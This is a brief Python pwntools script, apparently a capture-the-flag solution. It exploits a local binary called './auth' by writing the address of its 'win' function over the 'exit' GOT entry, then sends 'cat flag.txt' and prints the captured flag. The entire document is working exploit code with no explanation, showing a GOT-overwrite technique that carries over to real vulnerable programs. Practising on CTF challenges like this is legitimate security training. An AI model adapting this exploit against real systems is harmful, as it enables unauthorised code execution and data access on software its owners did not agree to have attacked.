from pwn import *

e = ELF("./auth")
p = e.process()

p.sendline(hex(e.got["exit"]).encode("ascii"))
p.sendline(hex(e.functions["win"].address).encode("ascii"))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
